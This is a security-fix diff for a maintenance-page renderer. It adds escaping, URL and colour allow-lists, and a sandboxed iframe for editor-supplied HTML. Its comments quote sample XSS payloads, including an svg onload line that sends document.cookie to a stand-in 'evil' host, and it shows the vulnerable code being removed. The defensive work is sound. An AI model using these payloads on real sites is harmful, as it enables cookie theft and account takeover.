@@ -159,7 +159,7 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
 /* Social */
 .m-social{display:flex;gap:.6rem;flex-wrap:wrap;justify-content:center}
 .m-social a{display:flex;align-items:center;justify-content:center;width:40px;height:40px;border-radius:50%;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.04);transition:all .25s}
-.m-social a:hover{transform:translateY(-2px)}
+.m-social a:hover{transform:translateY(-2px);background:var(--m-accent,rgba(255,255,255,.04));border-color:var(--m-accent,rgba(255,255,255,.12))}
 
 /* Emoji */
 .m-emoji{font-size:2.5rem;margin-bottom:.75rem}
@@ -234,10 +234,49 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
 
   function pad(n) { return String(n).padStart(2, '0'); }
 
+  // textContent/innerHTML escapes & < > but NOT the double quote, so every
+  // value interpolated inside a quoted attribute (socialLinks[].url,
+  // messages[].buttonUrl, logoUrl, lottieUrl, contactEmail...) could close its
+  // own attribute with '" onfocus=alert(1) autofocus x="'.
   function esc(s) {
-    var d = document.createElement('div');
-    d.textContent = s || '';
-    return d.innerHTML;
+    return String(s == null ? '' : s)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
+  }
+
+  // Only http(s), mailto and site-relative paths may reach an href/src.
+  // 'javascript:' and 'data:' are the classic stored-XSS payloads for a field
+  // an editor can fill in.
+  function safeUrl(u, allowMailto) {
+    var raw = String(u == null ? '' : u).trim();
+    if (!raw) return '';
+    if (/^\\/(?!\\/)/.test(raw)) return raw;
+    var lower = raw.toLowerCase();
+    if (lower.indexOf('http://') === 0 || lower.indexOf('https://') === 0) return raw;
+    if (allowMailto && lower.indexOf('mailto:') === 0) return raw;
+    return '';
+  }
+
+  // A URL that lands inside 'url("…")' must not carry a quote, a parenthesis or
+  // whitespace: those close the CSS string and then the style attribute.
+  function cssUrl(u) {
+    var href = safeUrl(u);
+    if (!href || /["'()\\\\\\s;]/.test(href)) return '';
+    return href;
+  }
+
+  // Colours are concatenated into style attributes and CSS custom properties:
+  // anything that is not a colour literal is dropped rather than escaped, so it
+  // can neither close the attribute nor inject extra declarations.
+  function col(c, fallback) {
+    var raw = String(c == null ? '' : c).trim();
+    if (/^#(?:[0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})$/i.test(raw)) return raw;
+    if (/^(?:rgb|rgba|hsl|hsla)\\([0-9a-z.,%\\s\\/]*\\)$/i.test(raw)) return raw;
+    if (/^[a-z]{3,20}$/i.test(raw)) return raw;
+    return fallback;
   }
 
   function socialIcon(platform, color) {
@@ -314,11 +353,13 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
   // ─── Social links ───
   function socialHTML(links, textColor, accent) {
     if (!links || !links.length) return '';
-    var h = '<div class="m-social">';
+    var h = '<div class="m-social" style="--m-accent:'+esc(col(accent, '#3b82f6'))+'">';
     links.forEach(function(l) {
-      h += '<a href="'+esc(l.url)+'" target="_blank" rel="noopener noreferrer" title="'+esc(l.label || l.platform)+'" ' +
-        'onmouseenter="this.style.background=\\''+accent+'\\';this.style.borderColor=\\''+accent+'\\'" ' +
-        'onmouseleave="this.style.background=\\'rgba(255,255,255,.04)\\';this.style.borderColor=\\'rgba(255,255,255,.12)\\'">' +
+      var href = safeUrl(l.url);
+      if (!href) return;
+      // Hover is a CSS rule (.m-social a:hover) — the accent colour has no
+      // business being concatenated into an inline event handler.
+      h += '<a href="'+esc(href)+'" target="_blank" rel="noopener noreferrer" title="'+esc(l.label || l.platform)+'">' +
         socialIcon(l.platform, textColor) + '</a>';
     });
     h += '</div>';
@@ -337,12 +378,12 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
 
     // Lottie
     if (data.lottieUrl) {
-      h += '<div style="width:200px;height:200px;margin:0 auto 1.5rem"><dotlottie-player src="'+esc(data.lottieUrl)+'" background="transparent" speed="1" style="width:100%;height:100%" loop autoplay></dotlottie-player></div>';
+      h += '<div style="width:200px;height:200px;margin:0 auto 1.5rem"><dotlottie-player src="'+esc(safeUrl(data.lottieUrl))+'" background="transparent" speed="1" style="width:100%;height:100%" loop autoplay></dotlottie-player></div>';
     }
 
     // Logo
     if (data.logoUrl) {
-      h += '<img src="'+esc(data.logoUrl)+'" alt="Logo" class="m-logo">';
+      h += '<img src="'+esc(safeUrl(data.logoUrl))+'" alt="Logo" class="m-logo">';
     }
 
     // Icon for minimal/video-background
@@ -396,14 +437,14 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
 
     // CTA
     if (msg && msg.buttonLabel && msg.buttonUrl) {
-      h += '<a href="'+esc(msg.buttonUrl)+'" class="m-cta" style="background:'+esc(accent)+';box-shadow:0 4px 14px '+esc(accent)+'40">' +
+      h += '<a href="'+esc(safeUrl(msg.buttonUrl) || '#')+'" class="m-cta" style="background:'+esc(accent)+';box-shadow:0 4px 14px '+esc(accent)+'40">' +
         esc(msg.buttonLabel) +
         '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></a>';
     }
 
     // Contact
     if (data.contactEmail) {
-      h += '<a href="mailto:'+esc(data.contactEmail)+'" class="m-contact" style="color:'+esc(textColor)+'">' +
+      h += '<a href="'+esc(safeUrl('mailto:' + String(data.contactEmail || '').replace(/[\\s"'<>]/g, ''), true))+'" class="m-contact" style="color:'+esc(textColor)+'">' +
         '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>' +
         esc(data.contactEmail) + '</a>';
     }
@@ -417,7 +458,7 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
   // ─── Template wrappers ───
   function wrapDefault(data, content, bg, textColor, accent, overlayOpacity) {
     var bgStyle = data.backgroundImageUrl
-      ? 'background:url('+data.backgroundImageUrl+') center/cover no-repeat fixed'
+      ? 'background:url(&quot;'+esc(cssUrl(data.backgroundImageUrl))+'&quot;) center/cover no-repeat fixed'
       : 'background:'+bg;
     var overlay = data.backgroundImageUrl
       ? '<div class="m-overlay" style="background:'+esc(bg)+';opacity:'+overlayOpacity+'"></div>'
@@ -431,7 +472,7 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
 
   function wrapGlass(data, content, bg, textColor, accent, overlayOpacity) {
     var bgStyle = data.backgroundImageUrl
-      ? 'background:url('+data.backgroundImageUrl+') center/cover no-repeat fixed'
+      ? 'background:url(&quot;'+esc(cssUrl(data.backgroundImageUrl))+'&quot;) center/cover no-repeat fixed'
       : 'background:linear-gradient(135deg,'+esc(bg)+','+esc(accent)+'22)';
     var overlay = data.backgroundImageUrl
       ? '<div class="m-overlay" style="background:'+esc(bg)+';opacity:'+overlayOpacity+'"></div>'
@@ -452,7 +493,7 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
   function wrapSplit(data, content, bg, textColor, accent, overlayOpacity) {
     var imgUrl = data.splitImageUrl || data.backgroundImageUrl;
     var imgPart = imgUrl
-      ? '<div class="m-split-image" style="background-image:url('+imgUrl+')">' +
+      ? '<div class="m-split-image" style="background-image:url(&quot;'+esc(cssUrl(imgUrl))+'&quot;)">' +
         '<div class="m-split-image-overlay" style="background:linear-gradient(135deg,'+esc(accent)+'33,transparent)"></div></div>'
       : '';
     return '<div class="m-split" style="color:'+esc(textColor)+'">' +
@@ -463,7 +504,7 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
 
   function wrapVideo(data, content, bg, textColor, accent, overlayOpacity) {
     var video = data.videoUrl
-      ? '<video autoplay loop muted playsinline class="m-video"><source src="'+esc(data.videoUrl)+'" type="video/mp4"></video>'
+      ? '<video autoplay loop muted playsinline class="m-video"><source src="'+esc(safeUrl(data.videoUrl))+'" type="video/mp4"></video>'
       : '';
     return '<div class="m-root" style="color:'+esc(textColor)+'">' +
       video +
@@ -676,11 +717,11 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
   // ─── Render ───
   function render(data) {
     var dark = isDarkMode(data.darkMode || 'dark');
-    var rawBg = data.backgroundColor || '#0f172a';
-    var rawText = data.textColor || '#f8fafc';
+    var rawBg = col(data.backgroundColor, '#0f172a');
+    var rawText = col(data.textColor, '#f8fafc');
     var bg = dark ? rawBg : (data.darkMode === 'auto' ? '#ffffff' : rawBg);
     var textColor = dark ? rawText : (data.darkMode === 'auto' ? '#1e293b' : rawText);
-    var accent = data.accentColor || '#3b82f6';
+    var accent = col(data.accentColor, '#3b82f6');
     var overlayOpacity = (data.backgroundOverlayOpacity != null ? data.backgroundOverlayOpacity : 70) / 100;
 
     var msgs = data.messages || [];
@@ -720,7 +761,7 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
     if (data.googleFont) {
       var fontUrl = 'https://fonts.googleapis.com/css2?family=' + encodeURIComponent(data.googleFont) + ':wght@400;600;700;800&display=swap';
       extras += '<link rel="stylesheet" href="'+fontUrl+'">';
-      document.body.style.fontFamily = '"'+data.googleFont+'", system-ui, -apple-system, sans-serif';
+      document.body.style.fontFamily = '"'+String(data.googleFont).replace(/[^\\w \\-]/g, '')+'", system-ui, -apple-system, sans-serif';
     }
 
     // Lottie script
@@ -751,18 +792,29 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
     // Favicon
     if (data.faviconUrl) {
       var existing = document.querySelector('link[rel="icon"]');
-      if (existing) existing.setAttribute('href', data.faviconUrl);
-      else {
-        var link = document.createElement('link');
-        link.rel = 'icon';
-        link.href = data.faviconUrl;
-        document.head.appendChild(link);
+      var faviconHref = safeUrl(data.faviconUrl);
+      if (faviconHref) {
+        if (existing) existing.setAttribute('href', faviconHref);
+        else {
+          var link = document.createElement('link');
+          link.rel = 'icon';
+          link.href = faviconHref;
+          document.head.appendChild(link);
+        }
       }
     }
 
-    // Custom CSS
+    // Custom CSS is applied through a real <style> node: concatenating it into
+    // the innerHTML string let a '</style><img src=x onerror=...>' payload
+    // escape the stylesheet and execute.
     if (data.customCSS) {
-      extras += '<style>'+data.customCSS+'</style>';
+      var customStyle = document.getElementById('m-custom-css');
+      if (!customStyle) {
+        customStyle = document.createElement('style');
+        customStyle.id = 'm-custom-css';
+        document.head.appendChild(customStyle);
+      }
+      customStyle.textContent = data.customCSS;
     }
 
     // Set page title
@@ -883,22 +935,35 @@ body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background
       return r.json();
     })
     .then(function(data) {
-      // Custom HTML template
+      // Custom HTML template.
+      // The markup comes from an editor account (the host can widen who edits
+      // the global through 'adminAccess'), so it is NEVER assigned to the
+      // page's own innerHTML: '<svg/onload=fetch('//evil/?c='+document.cookie)>'
+      // would then run on this origin, in front of every visitor and of the
+      // admin previewing /maintenance. It is rendered inside a sandboxed
+      // iframe: no script execution, no access to this document, no cookies.
       if (data.template === 'custom' && data.customHTML) {
         var msgs = data.messages || [];
         currentLang = detectLanguage(msgs);
         var msg = msgs.find(function(m){ return m.language === currentLang; }) || msgs[0];
         var html = data.customHTML
-          .replace(/\\{\\{title\\}\\}/g, (msg && msg.title) || '')
-          .replace(/\\{\\{description\\}\\}/g, (msg && msg.description) || '')
-          .replace(/\\{\\{estimatedEnd\\}\\}/g, data.estimatedEnd ? formatDate(data.estimatedEnd, currentLang) : '')
-          .replace(/\\{\\{logoUrl\\}\\}/g, data.logoUrl || '');
-        document.getElementById('app').innerHTML = html;
-        if (data.customCSS) {
-          var s = document.createElement('style');
-          s.textContent = data.customCSS;
-          document.head.appendChild(s);
-        }
+          .replace(/\\{\\{title\\}\\}/g, esc((msg && msg.title) || ''))
+          .replace(/\\{\\{description\\}\\}/g, esc((msg && msg.description) || ''))
+          .replace(/\\{\\{estimatedEnd\\}\\}/g, esc(data.estimatedEnd ? formatDate(data.estimatedEnd, currentLang) : ''))
+          .replace(/\\{\\{logoUrl\\}\\}/g, esc(safeUrl(data.logoUrl)));
+        var doc = '<!DOCTYPE html><html><head><meta charset="utf-8">' +
+          '<meta name="viewport" content="width=device-width,initial-scale=1">' +
+          '<style>html,body{margin:0;padding:0;min-height:100%}</style>' +
+          (data.customCSS ? '<style>' + String(data.customCSS).replace(/<\\/(?=style)/gi, '<\\\\/') + '</style>' : '') +
+          '</head><body>' + html + '</body></html>';
+        var frame = document.createElement('iframe');
+        frame.setAttribute('sandbox', '');
+        frame.setAttribute('title', 'Maintenance');
+        frame.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;border:0';
+        frame.srcdoc = doc;
+        var app = document.getElementById('app');
+        app.innerHTML = '';
+        app.appendChild(frame);
         return;
       }
       render(data);
